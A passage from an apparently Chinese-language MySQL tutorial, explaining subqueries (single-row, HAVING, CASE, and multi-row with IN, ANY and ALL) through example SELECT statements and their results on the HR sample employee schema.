<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> player_id, player_name, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> num # 顺序 <span class="number">5</span></span><br><span class="line"><span class="keyword">FROM</span> player <span class="keyword">JOIN</span> team <span class="keyword">ON</span> player.team_id <span class="operator">=</span> team.team_id # 顺序 <span class="number">1</span></span><br><span class="line"><span class="keyword">WHERE</span> height <span class="operator">&gt;</span> <span class="number">1.80</span> # 顺序 <span class="number">2</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> player.team_id # 顺序 <span class="number">3</span></span><br><span class="line"><span class="keyword">HAVING</span> num <span class="operator">&gt;</span> <span class="number">2</span> # 顺序 <span class="number">4</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> num <span class="keyword">DESC</span> # 顺序 <span class="number">6</span></span><br><span class="line">LIMIT <span class="number">2</span> # 顺序 <span class="number">7</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="九、子查询"><a href="#九、子查询" class="headerlink" title="九、子查询"></a>九、子查询</h1><p>子查询指一个查询语句嵌套在另一个查询语句内部的查询，这个特性从MySQL 4.1开始引入。SQL 中子查询的使用大大增强了 SELECT 查询的能力，因为很多时候查询需要从结果集中获取数据，或者需要从同一个表中先计算得出一个数据结果，然后与这个数据结果（可能是某个标量，也可能是某个集合）进行比较。</p>
<h2 id="1-子查询引入"><a href="#1-子查询引入" class="headerlink" title="1. 子查询引入"></a>1. 子查询引入</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140116.png" alt="  "></p>
<p><strong>现有解决方式：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 方式一：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> salary   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> last_name,salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> <span class="number">11000</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> last_name <span class="operator">|</span> salary   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> King      <span class="operator">|</span> <span class="number">24000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Kochhar   <span class="operator">|</span> <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> De Haan   <span class="operator">|</span> <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Greenberg <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Russell   <span class="operator">|</span> <span class="number">14000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Partners  <span class="operator">|</span> <span class="number">13500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Errazuriz <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Ozer      <span class="operator">|</span> <span class="number">11500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hartstein <span class="operator">|</span> <span class="number">13000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Higgins   <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式二：自连接</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> e2.last_name,e2.salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees e1,employees e2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> e1.last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">AND</span> e1.salary <span class="operator">&lt;</span> e2.salary;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> last_name <span class="operator">|</span> salary   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> King      <span class="operator">|</span> <span class="number">24000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Kochhar   <span class="operator">|</span> <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> De Haan   <span class="operator">|</span> <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Greenberg <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Russell   <span class="operator">|</span> <span class="number">14000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Partners  <span class="operator">|</span> <span class="number">13500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Errazuriz <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Ozer      <span class="operator">|</span> <span class="number">11500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hartstein <span class="operator">|</span> <span class="number">13000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Higgins   <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式三：子查询</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> last_name,salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			<span class="keyword">SELECT</span> salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			<span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> last_name <span class="operator">|</span> salary   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> King      <span class="operator">|</span> <span class="number">24000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Kochhar   <span class="operator">|</span> <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> De Haan   <span class="operator">|</span> <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Greenberg <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Russell   <span class="operator">|</span> <span class="number">14000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Partners  <span class="operator">|</span> <span class="number">13500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Errazuriz <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Ozer      <span class="operator">|</span> <span class="number">11500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hartstein <span class="operator">|</span> <span class="number">13000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Higgins   <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.30</span> sec)</span><br></pre></td></tr></table></figure>


<h2 id="2-子查询的基本使用"><a href="#2-子查询的基本使用" class="headerlink" title="2. 子查询的基本使用"></a>2. 子查询的基本使用</h2><ul>
<li>子查询的基本语法结构：</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140120.png" alt="  "></p>
<ul>
<li>子查询（内查询）在主查询之前一次执行完成。</li>
<li>子查询的结果被主查询（外查询）使用 。</li>
<li>注意事项<ul>
<li>子查询要包含在括号内</li>
<li>将子查询放在比较条件的右侧</li>
<li>单行操作符对应单行子查询，多行操作符对应多行子查询</li>
</ul>
</li>
</ul>
<h2 id="3-单行子查询"><a href="#3-单行子查询" class="headerlink" title="3. 单行子查询"></a>3. 单行子查询</h2><h3 id="（1）单行比较操作符"><a href="#（1）单行比较操作符" class="headerlink" title="（1）单行比较操作符"></a>（1）单行比较操作符</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140122.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：返回job_id与<span class="number">141</span>号员工相同，salary比<span class="number">143</span>号员工多的员工姓名，job_id和工资</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> last_name,job_id,salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> job_id <span class="operator">=</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> job_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">141</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          )</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">AND</span> salary <span class="operator">&gt;</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">143</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          );</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+----------+---------+</span></span><br><span class="line"><span class="operator">|</span> last_name   <span class="operator">|</span> job_id   <span class="operator">|</span> salary  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+----------+---------+</span></span><br><span class="line"><span class="operator">|</span> Nayer       <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3200.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Mikkilineni <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">2700.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Bissot      <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Atkinson    <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">2800.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Mallin      <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Rogers      <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">2900.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Ladwig      <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3600.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Stiles      <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3200.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Seo         <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">2700.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Rajs        <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Davies      <span class="operator">|</span> ST_CLERK <span class="operator">|</span> <span class="number">3100.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+----------+---------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.10</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 要求：查询与<span class="number">141</span>号员工的manager_id和department_id相同的其他员工的employee_id，manager_id，department_id。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id,manager_id,department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> (manager_id,department_id) <span class="operator">=</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>        	<span class="keyword">SELECT</span> manager_id,department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>        	<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>       	<span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">141</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>       	)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">AND</span> employee_id <span class="operator">&lt;&gt;</span> <span class="number">141</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> manager_id <span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+------------+---------------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">142</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">143</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">144</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">196</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">197</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">198</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">199</span> <span class="operator">|</span>        <span class="number">124</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+------------+---------------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（2）HAVING中的子查询"><a href="#（2）HAVING中的子查询" class="headerlink" title="（2）HAVING中的子查询"></a>（2）HAVING中的子查询</h3><ul>
<li>首先执行子查询。</li>
<li>向主查询中的HAVING 子句返回结果。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询最低工资大于<span class="number">110</span>号部门最低工资的部门id和其最低工资</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">MIN</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> department_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="built_in">MIN</span>(salary) <span class="operator">&gt;</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			<span class="keyword">WHERE</span> department_id <span class="operator">=</span> <span class="number">110</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 			);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">MIN</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">70</span> <span class="operator">|</span>    <span class="number">10000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span>    <span class="number">17000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（3）CASE中的子查询"><a href="#（3）CASE中的子查询" class="headerlink" title="（3）CASE中的子查询"></a>（3）CASE中的子查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：显式员工的employee_id,last_name和location。</span><br><span class="line">mysql<span class="operator">&gt;</span> # 其中，若员工department_id与location_id为<span class="number">1800</span>的department_id相同，</span><br><span class="line">mysql<span class="operator">&gt;</span> # 则location为’Canada’，其余则为’USA’，只显示前面<span class="number">3</span>条数据。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id,last_name,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">CASE</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> department_id <span class="keyword">FROM</span> departments <span class="keyword">WHERE</span> location_id <span class="operator">=</span> <span class="number">1800</span>) <span class="keyword">THEN</span> <span class="string">&#x27;Canada&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">ELSE</span> <span class="string">&#x27;USA&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> &quot;location&quot;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">0</span>, <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> last_name <span class="operator">|</span> location <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">100</span> <span class="operator">|</span> King      <span class="operator">|</span> USA      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">101</span> <span class="operator">|</span> Kochhar   <span class="operator">|</span> USA      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">102</span> <span class="operator">|</span> De Haan   <span class="operator">|</span> USA      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<h2 id="4-多行子查询"><a href="#4-多行子查询" class="headerlink" title="4. 多行子查询"></a>4. 多行子查询</h2><ul>
<li>也称为集合比较子查询</li>
<li>内查询返回多行</li>
<li>使用多行比较操作符</li>
</ul>
<h3 id="（1）多行比较操作符"><a href="#（1）多行比较操作符" class="headerlink" title="（1）多行比较操作符"></a>（1）多行比较操作符</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140128.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # <span class="keyword">IN</span>:</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id, last_name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span>   employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span>  salary <span class="keyword">IN</span>(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">0</span>, <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> last_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">101</span> <span class="operator">|</span> Kochhar   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">102</span> <span class="operator">|</span> De Haan   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">104</span> <span class="operator">|</span> Ernst     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # <span class="keyword">ANY</span> <span class="operator">/</span> <span class="keyword">ALL</span>:</span><br><span class="line">mysql<span class="operator">&gt;</span> # 需求：返回其它job_id中比job_id为‘IT_PROG’部门任一工资低的员工的员工号、姓名、job_id 以及salary</span><br><span class="line">mysql<span class="operator">&gt;</span> # 返回前 <span class="number">3</span> 条</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id,last_name,job_id,salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> job_id <span class="operator">&lt;&gt;</span> <span class="string">&#x27;IT_PROG&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">AND</span> salary <span class="operator">&lt;</span> <span class="keyword">ANY</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">WHERE</span> job_id <span class="operator">=</span> <span class="string">&#x27;IT_PROG&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          )</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">0</span>, <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+------------+---------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> last_name <span class="operator">|</span> job_id     <span class="operator">|</span> salary  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+------------+---------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">206</span> <span class="operator">|</span> Gietz     <span class="operator">|</span> AC_ACCOUNT <span class="operator">|</span> <span class="number">8300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">200</span> <span class="operator">|</span> Whalen    <span class="operator">|</span> AD_ASST    <span class="operator">|</span> <span class="number">4400.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">110</span> <span class="operator">|</span> Chen      <span class="operator">|</span> FI_ACCOUNT <span class="operator">|</span> <span class="number">8200.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+------------+---------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 需求：返回其它job_id中比job_id为‘IT_PROG’部门所有工资低的员工的员工号、姓名、job_id 以及salary</span><br><span class="line">mysql<span class="operator">&gt;</span> # 返回前 <span class="number">3</span> 条</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id,last_name,job_id,salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> job_id <span class="operator">&lt;&gt;</span> <span class="string">&#x27;IT_PROG&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">AND</span> salary <span class="operator">&lt;</span> <span class="keyword">ALL</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">WHERE</span> job_id <span class="operator">=</span> <span class="string">&#x27;IT_PROG&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          )</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">0</span>, <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------+---------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> last_name <span class="operator">|</span> job_id   <span class="operator">|</span> salary  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------+---------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">115</span> <span class="operator">|</span> Khoo      <span class="operator">|</span> PU_CLERK <span class="operator">|</span> <span class="number">3100.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">116</span> <span class="operator">|</span> Baida     <span class="operator">|</span> PU_CLERK <span class="operator">|</span> <span class="number">2900.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">117</span> <span class="operator">|</span> Tobias    <span class="operator">|</span> PU_CLERK <span class="operator">|</span> <span class="number">2800.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------+---------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


